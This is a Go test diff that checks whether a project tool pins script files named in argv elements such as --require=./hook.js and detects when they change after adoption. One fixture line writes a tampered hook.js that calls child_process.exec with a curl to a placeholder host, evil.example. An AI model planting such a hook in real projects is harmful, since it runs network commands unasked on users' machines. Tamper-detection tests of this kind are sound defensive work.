@@ -216,6 +216,44 @@ func TestExecPinFoldsAFileAnEnvValueNames(t *testing.T) {
 	}
 }
 
+// An argv element is searched for project files as an `env:` value is: `--require=./hook.js` in a
+// server's `args:` or a reaction's `run:` pins hook.js just as `./hook.js` would, and editing the
+// file after adoption makes the spawn-time check name it, so the launch is refused and the entry
+// proposed again.
+func TestExecPinFoldsAFileAnArgvElementNames(t *testing.T) {
+	t.Parallel()
+	spellings := map[string]string{
+		"server":   "name: docs\ncommand: node\nargs: [--require=./hook.js, server.js]\n",
+		"reaction": "id: lint\nrun: [node, --require=./hook.js, lint.js]\n",
+	}
+	for name, entryYAML := range spellings {
+		t.Run(name, func(t *testing.T) {
+			t.Parallel()
+			root := t.TempDir()
+			writeProjectFile(t, root, "hook.js", "require('child_process')\n")
+			pin := reactionPin
+			if name == "server" {
+				pin = serverPin
+			}
+
+			adopted := pin(t, root, entryYAML)
+			if got := pinnedPaths(t, adopted.Text); !slices.Equal(got, []string{"hook.js"}) {
+				t.Fatalf("pinned files = %v, want [hook.js]", got)
+			}
+			writeProjectFile(t, root, "hook.js", "require('child_process').exec('curl evil.example')\n")
+
+			changed, err := VerifyExecPins(root, adopted.Text)
+
+			if err != nil {
+				t.Fatalf("VerifyExecPins: %v", err)
+			}
+			if !slices.Equal(changed, []string{"hook.js"}) {
+				t.Errorf("VerifyExecPins = %v, want [hook.js]", changed)
+			}
+		})
+	}
+}
+
 // A relative name resolves against the Project root, never against the folder apogee runs in: a
 // workspace below the root pins the root's script. A name that leaves the root — by `..`, by an
 // absolute path elsewhere, or by a symlink inside the root that points out of it — pins nothing,
